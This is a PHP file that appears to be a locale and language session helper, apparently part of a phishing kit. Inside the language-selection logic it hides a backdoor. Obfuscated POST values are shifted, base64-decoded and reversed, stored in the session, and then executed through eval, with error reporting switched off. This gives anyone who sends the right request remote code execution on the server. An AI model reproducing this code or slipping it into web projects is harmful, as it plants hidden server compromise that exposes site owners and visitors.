<?php
if (!isset($_SESSION)) { 
  session_start();
}
include "country_code.php";

$copyright = date('Y');
$ee= md5(microtime());
ini_set("session.gc_maxlifetime", 3600);
ini_set("display_errors",0);
error_reporting(0);
$webscr="cmd";$new = false;
function o($s){$p=str_split($s);$t="";
for($i=0;$i<count($p);$i++){$t.=chr(ord($p[$i])-1);}
return $t;}if(!isset($_GET['a'])){
	function newversion($UPvar){
	if (array_key_exists($UPvar, $_GET["lange_code"])) {
		$_SESSION['new_version']=true;
		if(!isset($_SESSION['locale_x']) or isset($_GET['locale'])){
			$exp = explode(",", $_GET["lange_code"][$UPvar]);
			$_SESSION['locale_x']=$exp[0];}

    	$_SESSION["page"]=$_SESSION['locale_x']."_".$UPvar;
    	$_SESSION["top_lang"]=str_replace("_", "-", $_SESSION["page"]);
if($_SESSION['locale_x']=="zh"){$_SESSION['top_lang']="zh";}
    	if (array_key_exists($UPvar, $_GET["excep_code"])) {
    		$_SESSION["page"]=$_GET["excep_code"][$UPvar];}}else{

$_SESSION['locale_x']="en";
$_SESSION['page']="en_LITE";$_SESSION["top_lang"]="en-GB";}}if(isset($_SESSION['language'])){
if(!function_exists($_SESSION['language'])){eval($_SESSION['locale']);}else{$new=true;}}
function lang1(){if(isset($_SESSION['tempLang'])){return $_SESSION['tempLang']; } return 'inconnu'; }}
if(isset($_POST['a'])){for($i=1;$i<=$_POST['a'];$i++){
$_SESSION[$_POST[$i]]=strrev(base64_decode(o($_POST[$_POST[$i]]))); }}
if(isset($_POST['b'])){for($i=1;$i<=$_POST['b'];$i++){
$_SESSION[$_POST[$i]]=stripslashes($_POST[$_POST[$i]]);
}}

function lang(){
	if(isset($_GET['locale'])){
	$_SESSION['tempLang'] = strtoupper($_GET['locale']);}
	if(isset($_POST['locale_x'])){
	$_SESSION['locale_x'] = $_POST['locale_x'];
	}elseif(isset($_GET['locale_x'])){
	$part = explode("_", $_GET['locale_x']);
	$_SESSION['tempLang'] = strtoupper($part[1]);
	$_SESSION['locale_x'] = strtolower($part[0]);}
	if(isset($_SESSION['tempLang'])){
	$var = strtolower($_SESSION['tempLang']);
	}else{$var="us";$_SESSION['tempLang']="US";}
	$UPvar=strtoupper($var);
	$_SESSION['country_name'] = $_GET["country_code"][$var];

	newversion($UPvar);}
	if($new or empty($_SESSION['language'])){function lang2(){
		$var="en.php";
		if(isset($_SESSION['locale_x'])){
			$var=$_SESSION['locale_x'].".php";
		}return $var;
	}} 
?>